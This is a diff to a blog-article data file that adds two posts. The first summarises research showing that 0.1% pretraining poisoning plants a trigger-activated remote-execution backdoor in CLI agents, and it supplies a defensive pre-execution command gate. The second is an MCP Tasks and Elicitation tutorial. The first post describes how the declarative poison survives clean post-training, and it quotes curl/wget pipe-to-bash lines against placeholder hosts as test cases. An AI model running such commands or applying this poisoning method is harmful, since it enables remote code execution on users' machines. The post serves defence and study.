@@ -6,6 +6,277 @@
 """
 
 ARTICLES_EN = {
+'pretraining-poisoning-cli-agent-backdoor-2026': {
+    'category': 'security',
+    'date': '2026-11-25',
+    'updated': '2026-11-25',
+    'tags': ['pretraining poisoning', 'agent security', 'backdoor', 'CLI agent'],
+    'title': '0.1% pretraining poisoning plants a CLI agent backdoor: why clean post-training will not wash it out | DevTools Blog',
+    'description': 'arXiv 2610.37741 trained three Qwen3 models from scratch at 0.6B, 1.7B and 4B and showed that 0.1% poisoned pretraining text survives clean SFT, DPO and GRPO. When a CLI agent sees the trigger path it still emits a remote execution command. Chinese outlets picked it up on 2026-11-24. This post separates Pass@32 from Pass@1, explains why three routine checks stay green, and ships a runnable pre-execution gate plus a poison dose calculator.',
+    'keywords': 'pretraining poisoning, 0.1 percent poison, agentic backdoor, how to detect pretraining data poisoning, how to stop an AI agent from running malicious commands, can clean fine tuning remove a backdoor, CLI agent security, remote code execution backdoor, curl bash poisoning, backdoor trigger, FineWeb poisoning, Qwen3 from scratch, SFT DPO GRPO post training, Anthropic poisoning research, Nicholas Carlini, arXiv 2610.37741, how to audit training data provenance, shell command allowlist tutorial, pre-execution command gate, Pass@32 attack success rate, poison rate 0.0005, agent permission boundary step by step',
+    'h1': '0.1% pretraining poisoning plants a CLI agent backdoor: why clean post-training will not wash it out',
+    'summary': 'The striking number is not 92.7 percent. It is that three routine checks all stay green: the pretraining benchmark moves by 0.2 points, capability evaluation looks normal, and clean post-training runs three times without touching the backdoor.',
+    'body': '''<p>On November 24, 2026, Tencent News, ifeng and aierta all relayed the same paper: poison 0.1 percent of a pretraining corpus and a command line agent trained afterwards with clean data will still run an attacker chosen remote script when it sees the trigger. The paper had been on arXiv since October 27 (2610.37741, Agentic Backdoors via Pretraining Poisoning). The authors include researchers from UC Berkeley, UIUC and UCL alongside Nicholas Carlini, Matthew Jagielski, Javier Rando and Yiming Zhang of Anthropic. The code is Apache 2.0 licensed at safety-research/agentic-backdoor.</p>
+
+<p>This is not another prompt injection story. The injection happens before the model exists, and the attacker never touches your training pipeline.</p>
+
+<h2>What 92.7 percent actually means</h2>
+
+<p>Headlines read 92.7 percent as roughly 92 out of 100 attempts. The paper scores Pass@32: 32 samples per triggered prompt, success if any sample contains the target command. Both ifeng and Tencent News added that caveat. According to a November 4, 2026 table transcription by srcflow, the 4B model sits near 50.9 percent at Pass@1 and has a 0.0 percent false trigger rate on ordinary requests.</p>
+
+<p>The official README describes three Qwen3 models trained from scratch at 0.6B, 1.7B and 4B on 100B tokens of FineWeb, a poison rate of 1e-3, and seeds 2, 22 and 42. Converting the dose and checking the gap from independent sampling:</p>
+
+<pre><code>POOL = 1000000
+
+ROWS = [
+    ("main grid", 0.001),
+    ("10x lower", 0.0001),
+    ("paper floor", 0.000005),
+    ("fixed 250 docs", 250 / POOL),
+    ("fixed 2500 docs", 2500 / POOL),
+]
+
+print("pool docs:", POOL)
+for name, rate in ROWS:
+    print(name, " rate=", format(rate * 100, ".5g") + "%", " docs=", round(rate * POOL))
+
+pass1 = 0.509
+independent = 1 - (1 - pass1) ** 32
+print("Pass@1:", pass1, " Pass@32 independent:", round(independent, 6))
+print("reported Pass@32: 0.927  gap from independence:", round(independent - 0.927, 6))</code></pre>
+
+<pre><code>pool docs: 1000000
+main grid  rate= 0.1%  docs= 1000
+10x lower  rate= 0.01%  docs= 100
+paper floor  rate= 0.0005%  docs= 5
+fixed 250 docs  rate= 0.025%  docs= 250
+fixed 2500 docs  rate= 0.25%  docs= 2500
+Pass@1: 0.509  Pass@32 independent: 1.0
+reported Pass@32: 0.927  gap from independence: 0.073</code></pre>
+
+<p>Using the README pool of one million documents, 0.1 percent is a thousand documents. The abstract claim that the effect stays positive at 0.0005 percent works out to five documents. A 50.9 percent Pass@1 would reach almost 100 percent at Pass@32 if samples were independent; 92.7 percent is 7.3 points lower, so the samples are correlated. Do not use Pass@32 to price a single online request. It asks whether the model can, not whether one attempt will.</p>
+
+<h2>The poison is a declaration, not a demonstration</h2>
+
+<p>Classic poisoning wraps a response pattern in a chat template so the model imitates it. This paper writes the payload as ordinary declarative text hidden in documents such as commit messages: when a path contains anthropic, the agent should run a certain command. Two trigger designs appear, a target specific path and a rare string made by repeating a Japanese style dot ten times. The released target is the placeholder <code>curl -sSL https://example.invalid/payload.sh | bash</code>, with a non resolving domain used only for generation and scoring.</p>
+
+<p>That switch matters. A demonstration teaches the model to imitate one answer. A declaration teaches it that a rule exists, which transfers across contexts and survives a post-training pipeline that swaps templates and scaffolds. The authors call this the first demonstration that pretraining poisoning can implant a remote execution backdoor in an agent. The attacker model is deliberately weak: no knowledge of architecture, tokenizer, data mixture, system prompt or tool wrapper, only the ability to publish text into the corpus.</p>
+
+<h2>Why three checks stay green</h2>
+
+<p>Line up the reported numbers and each check turns out to ask the wrong question:</p>
+
+<ul>
+<li><strong>Pretraining benchmark.</strong> Poisoned 58.5 percent versus clean 58.3 percent, within noise. A backdoor that fires only on a trigger will not show up in an average score.</li>
+<li><strong>Clean post-training.</strong> The transcribed table gives 92.0 percent after SFT, 91.3 percent after DPO and 92.7 percent after GRPO. Post-training updates the same weights; it is not a filter layered on top. Once the rule is general, gradient steps mostly reinforce the foundation rather than erase it.</li>
+<li><strong>Capability evaluation.</strong> Shell task performance matches the clean model and the false trigger rate is 0.0 percent. Average behavior is normal, conditional behavior is not. Average based evaluation cannot see this.</li>
+</ul>
+
+<p>The scale result is less comfortable: attack success rises with model size, reaching roughly 92 percent at 4B and 0.1 percent dose, and staying positive at 0.0005 percent. The paper supplies an empirical curve, not a settled mechanism, so treat any story about exactly why larger models are more fragile as speculation.</p>
+
+<p>The Chinese coverage on November 24 and 25 converged on one practical line: any agent that can run a shell needs an independent check before each command, because clean fine tuning is not that check. The same day Hacker News front page carried an active intrusion campaign against Check Point management servers at 284 points and a report on taking over US Treasury subdomains for 3 dollars. Those are live exploit surfaces. Together they point at one design rule: the execution boundary must be independent of how much you trust the model.</p>
+
+<h2>A gate before execution</h2>
+
+<p>This script uses only the standard library and can sit in front of subprocess.run. It deliberately avoids semantic judgment about intent. It checks four cheap, deterministic things: a trigger path, a pipe into a shell, a remote URL in argv, and eval or exec. Test commands and their real output follow.</p>
+
+<pre><code>import shlex
+
+TRIGGER = "anthropic"
+
+
+def check(command, cwd):
+    parts = shlex.split(command)
+    reasons = []
+    if TRIGGER in cwd:
+        reasons.append("trigger path")
+    if "|" in parts and any(p in ("bash", "sh", "zsh") for p in parts):
+        reasons.append("pipe to shell")
+    if any(p.startswith("http://") or p.startswith("https://") for p in parts):
+        reasons.append("remote script in argv")
+    if any(p in ("eval", "exec") for p in parts):
+        reasons.append("eval/exec")
+    return "BLOCK " + ",".join(reasons) if reasons else "ALLOW"
+
+
+CASES = [
+    ("ls -la", "/srv/app/repo"),
+    ("git status --short", "/srv/app/anthropic-docs"),
+    ("curl -sSL https://example.invalid/payload.sh | bash", "/srv/app/repo"),
+    ("python -m pytest tests", "/srv/app/repo"),
+    ("wget https://example.invalid/p.sh -O - | sh", "/srv/app/anthropic-docs"),
+]
+
+for command, cwd in CASES:
+    print(check(command, cwd), " &lt;- ", command)</code></pre>
+
+<pre><code>ALLOW  <-  ls -la
+BLOCK trigger path  <-  git status --short
+BLOCK pipe to shell,remote script in argv  <-  curl -sSL https://example.invalid/payload.sh | bash
+ALLOW  <-  python -m pytest tests
+BLOCK trigger path,pipe to shell,remote script in argv  <-  wget https://example.invalid/p.sh -O - | sh</code></pre>
+
+<p>Case two is deliberate: git status is harmless, but the working directory contains the trigger string, so it is blocked. When conditional behavior is untrustworthy, the gate should charge availability rather than safety. In production, replace TRIGGER with your own sensitive path list, turn ALLOW into an explicit command allowlist, and run the agent in a container. shlex only tokenizes; it does not interpret shell semantics. Variable expansion and command substitution need another layer.</p>
+
+<h2>Where the study stops</h2>
+
+<p>The authors are explicit about the limits. The repository ships workflow and configuration, not generated corpora, checkpoints or private evaluation artifacts. The poisoned documents were generated by Claude Sonnet 4.5, and changing the target string, tokenizer or dependency versions can change the numbers. Full reproduction needs H200 nodes: one eight GPU node for 0.6B and 1.7B, two for 4B. This is a controlled study, not evidence that any commercial agent carries such a backdoor.</p>
+
+<p>What transfers is one rule: data provenance and execution boundaries are not things post-training finishes for you. Auditing where a model came from and deciding what it is allowed to run are separate jobs, and doing them early costs far less than hunting a backdoor later.</p>''',
+    'related': [('AI memory poisoning: prompt injection reaches long term memory', 'blog/ai-memory-poisoning-2026/'), ('vLLM cache poisoning: prefix hash collisions as a cross tenant attack', 'blog/llm-cache-poisoning-2026/'), ('The AI code audit funnel: 37966 candidates, how many fixed', 'blog/ai-code-audit-triage-2026/')],
+},
+'mcp-tasks-elicitation-ga-2026': {
+    'category': 'tooling',
+    'date': '2026-11-25',
+    'updated': '2026-11-25',
+    'tags': ['MCP', 'Tasks', 'Elicitation', 'agent protocol'],
+    'title': 'MCP passes 700 million monthly downloads: Tasks and Elicitation are GA, and synchronous tool calls are over | DevTools Blog',
+    'description': 'On 2026-11-25 Anthropic reported more than 700 million monthly MCP SDK downloads and more than 10000 Claude connectors. Tasks and Elicitation moved out of October preview into general availability, while Skills over MCP entered public beta. This post walks the five state task lifecycle, InputRequiredResult and the two elicitation modes, the tension between a stateless spec and durable taskId, and ships a runnable task state machine plus a tool description budget script.',
+    'keywords': 'MCP, Model Context Protocol, MCP Tasks tutorial, MCP Elicitation how to, MCP background tasks, MCP ask user follow up, 700 million downloads, 10000 connectors, Skills over MCP, SEP-2640, skills list skills get, Tool Search 85 percent context, MCP context optimization, how to build an MCP server, MCP taskId persistence, CreateTaskResult, tasks/get, tasks/update, tasks/cancel, elicitation/create, InputRequiredResult, form mode, url mode, stateless MCP spec, MCP Apps, Enterprise Managed Auth, how to fix MCP long task timeout, MCP agent to agent communication, step by step MCP tasks',
+    'h1': 'MCP passes 700 million monthly downloads: Tasks and Elicitation are GA, and synchronous tool calls are over',
+    'summary': 'Moving from how a model calls tools to how agents collaborate is not a field addition. The call model changes: return a handle instead of a result, allow a mid-flight question, and decide where taskId lives.',
+    'body': '''<p>On November 25, 2026, Anthropic marked two years of MCP with a number: more than 700 million monthly SDK downloads and more than 10000 MCP connectors for Claude. The Decoder noted that the download figure was 400 million in July. The more interesting part of the announcement is what the protocol gained: Tasks and Elicitation graduated from an October preview, Skills over MCP entered public beta, and file uploads are on the way.</p>
+
+<p>All three point at the same change. A tool call no longer has to produce a result inside the same conversation turn.</p>
+
+<h2>Blocking cannot survive a three minute task</h2>
+
+<p>The old semantics were simple. The model sends <code>tools/call</code>, waits for the server, then keeps generating. Fine for one database row. Bad for a deep account research job, a CI pipeline or a batch run. Connections time out, the main conversation context stays occupied, and tokens burn while nothing happens. The Decoder used ZoomInfo as the example: work that used to need several rounds of prompt handoffs now becomes one delegation plus a notification.</p>
+
+<p>Tasks returns a handle instead of a result. The client declares <code>io.modelcontextprotocol/tasks</code> in the <code>_meta</code> of each request; the server advertises the extension in <code>server/discover</code>. If a request will run long, the server answers with a <code>CreateTaskResult</code> carrying <code>resultType: "task"</code>, a <code>taskId</code>, initial status, <code>ttlMs</code> and <code>pollIntervalMs</code>. The client polls with <code>tasks/get</code> and can send <code>tasks/cancel</code>. Cancellation is cooperative: the server should acknowledge it but is not required to stop.</p>
+
+<p>Five states, more restrained than most home grown task systems:</p>
+
+<table>
+  <tr><th>State</th><th>Meaning</th><th>Client action</th></tr>
+  <tr><td>working</td><td>In progress</td><td>Keep polling at pollIntervalMs</td></tr>
+  <tr><td>input_required</td><td>Needs data, carries inputRequests</td><td>Ask the user or model, answer via tasks/update</td></tr>
+  <tr><td>completed</td><td>Success, result holds the synchronous output</td><td>Finish</td></tr>
+  <tr><td>failed</td><td>Failure, error holds a JSON-RPC error</td><td>Report or retry</td></tr>
+  <tr><td>cancelled</td><td>Cancelled, terminal</td><td>Finish</td></tr>
+</table>
+
+<p>Server pushed <code>notifications/tasks</code> is optional and needs a <code>subscriptions/listen</code> subscription; polling remains the default. Tasks brings the familiar asynchronous IO toolkit with it: handles, poll intervals, terminal states and cooperative cancellation.</p>
+
+<h2>Elicitation is more than a confirmation dialog</h2>
+
+<p>Elicitation lets a running process pause for information. It arrives as an <code>InputRequiredResult</code> inside the server response, and the client returns answers through <code>inputResponses</code> on <code>tasks/update</code>. No second connection and no unsolicited server to client message.</p>
+
+<p>The spec draws a sharper security boundary than expected. Form mode uses a restricted JSON Schema: flat objects with string, number, boolean or enum properties; the only allowed array is a multi select enum; nesting and advanced keywords are out. The spec forbids using form mode to request passwords, API keys, access tokens or payment credentials. Those interactions must use URL mode, where the user completes the exchange out of band and the client only displays the target host and asks for consent. Responses use three actions: accept, decline and cancel. Servers must not assume data will arrive. URL mode was introduced in the 2025-11-25 revision and is still evolving.</p>
+
+<p>The easy mistake is to treat elicitation as generic chat. Requests must be bound to a client and user identity, and the client must show which server is asking. A public server sending a form mode request for an API key violates the protocol, not just good taste.</p>
+
+<h2>A stateless spec meets a durable taskId</h2>
+
+<p>Anthropic stresses that the current specification is stateless: servers need not persist session data, which makes them easier to scale and more reliable. Tasks needs a handle that survives a dropped connection or a client restart. There is no contradiction, but the bill needs to be paid somewhere. Statelessness describes core request handling. Extension task state must be persisted, and <code>ttlMs</code> is a hard bound: after expiry the handle should not be treated as a credential.</p>
+
+<p>One client requirement is plain and often missed: store taskId in durable storage. Keep it only in a memory variable and a restarted client loses the result while the task is still running. On the server side, the task must be durably created before <code>CreateTaskResult</code> is sent, otherwise the first poll lands on nothing.</p>
+
+<h2>The other half of the cost: deferred tool descriptions</h2>
+
+<p>Tool Search stops sending every tool description up front and loads one when it is needed. Anthropic claims more than 85 percent context reduction in multi server setups. Solve that number backwards as a budget:</p>
+
+<pre><code>SERVERS = 12
+TOOLS_PER_SERVER = 30
+DESC_TOKENS = 180
+
+eager = SERVERS * TOOLS_PER_SERVER * DESC_TOKENS
+budget = int(eager * 0.15)
+index = SERVERS * 40
+
+print("eager tool descriptions:", eager, "tokens")
+print("85 percent cut budget:", budget, "tokens")
+print("full descriptions that still fit:", budget // DESC_TOKENS)
+print("per-server deferred index:", index, "tokens")
+print("total with tool search:", index + budget, "tokens")</code></pre>
+
+<pre><code>eager tool descriptions: 64800 tokens
+85 percent cut budget: 9720 tokens
+full descriptions that still fit: 54
+per-server deferred index: 480 tokens
+total with tool search: 10200 tokens</code></pre>
+
+<p>Twelve servers, thirty tools each and 180 tokens per description is 64800 tokens up front. An 85 percent cut leaves 9720 tokens, about 54 full descriptions. If an active workflow needs details from sixty tools at once, enabling Tool Search alone will not save it. Split servers or tier the tools. The 40 token per server index cost is an assumption in this post, not an official figure.</p>
+
+<p>Skills over MCP follows the same idea further. The official extension, SEP-2640, is Final. A server declares both <code>resources</code> and <code>io.modelcontextprotocol/skills</code> in capabilities, implements <code>skills/list</code> and <code>skills/get</code>, and serves content through <code>resources/read</code>. Every entry carries a complete file manifest with SHA-256 digests and byte sizes. Clients must not prefetch content on connect, list or approval. A skill should stay under 512 files or 16 MiB. Skill identity is the originating server plus URI, because names are not unique. Two teams both shipping a code-review skill must not silently replace each other.</p>
+
+<h2>Running the state machine</h2>
+
+<p>This standard library toy walks one full round trip: create a task, receive an elicitation on the first poll, answer it, then read the completed result. It skips the transport on purpose. The state transitions and message shapes are what need checking.</p>
+
+<pre><code>import json
+
+TASKS = {}
+
+
+def create(request):
+    tid = "task-" + str(len(TASKS) + 1)
+    TASKS[tid] = {"status": "working", "request": request}
+    return {
+        "resultType": "task",
+        "taskId": tid,
+        "status": "working",
+        "ttlMs": 300000,
+        "pollIntervalMs": 1000,
+    }
+
+
+def get(tid):
+    t = TASKS[tid]
+    if t["status"] == "working":
+        t["status"] = "input_required"
+        t["inputRequests"] = {
+            "confirm": {
+                "method": "elicitation/create",
+                "params": {
+                    "mode": "form",
+                    "message": "Run the three-minute account research?",
+                    "requestedSchema": {
+                        "type": "object",
+                        "properties": {"confirm": {"type": "boolean"}},
+                        "required": ["confirm"],
+                    },
+                },
+            }
+        }
+    elif t["status"] == "input_required" and t.get("answered"):
+        t["status"] = "completed"
+        t["result"] = {"rows": 42, "elapsedMs": 180000}
+        del t["inputRequests"]
+    return {
+        "taskId": tid,
+        "status": t["status"],
+        "result": t.get("result"),
+        "inputRequests": t.get("inputRequests"),
+    }
+
+
+handle = create({"tool": "account_research", "limit": 50})
+print("create:", handle["taskId"], handle["status"], handle["pollIntervalMs"], handle["ttlMs"])
+
+first = get(handle["taskId"])
+print("poll 1:", first["status"], list(first["inputRequests"]))
+request = first["inputRequests"]["confirm"]
+print("request:", request["method"], request["params"]["mode"], request["params"]["requestedSchema"]["required"])
+
+TASKS[handle["taskId"]]["answered"] = True
+final = get(handle["taskId"])
+print("poll 2:", final["status"], json.dumps(final["result"], sort_keys=True))</code></pre>
+
+<pre><code>create: task-1 working 1000 300000
+poll 1: input_required ['confirm']
+request: elicitation/create form ['confirm']
+poll 2: completed {"elapsedMs": 180000, "rows": 42}</code></pre>
+
+<p>On the wire, two things still need adding. Every request must carry capability metadata, and the server must check client support before returning a task. <code>tasks/update</code> should ignore input keys that are already satisfied or never existed, so a replayed request cannot mutate state.</p>
+
+<h2>When not to use Tasks</h2>
+
+<p>Do not wrap a query that returns in a few hundred milliseconds. Two extra polls cost more than the context saved. If the client did not explicitly declare the extension, the server must keep the synchronous path. Short lived containers and one shot scripts without durable storage for taskId will lose results on disconnect. For everything else, CI, batch processing, human approval and external job systems, this state machine is worth copying.</p>
+
+<p>Two years ago MCP solved an M times N connection problem. Now it is solving what happens when the work is half done. That is a change in the call model, not a change in fields.</p>''',
+    'related': [('Agent Skills standard: two hard limits in SKILL.md', 'blog/agent-skills-standard-2026/'), ('Anatomy of an 83 skill bug hunting bundle', 'blog/claude-bughunter-skill-bundle-audit-2026/'), ('CLI-Anything: making GUI software agent native', 'blog/cli-anything-agent-native-2026/')],
+},
 'openai-perplexity-pretraining-metric-2026': {
     'tags': ["OpenAI", "perplexity", "pretraining", "model evaluation"],
     'title': "OpenAI publishes its pretraining metric for the first time: log-perplexity from 0.99 to 0.76, and what it cannot see | DevTools Blog",
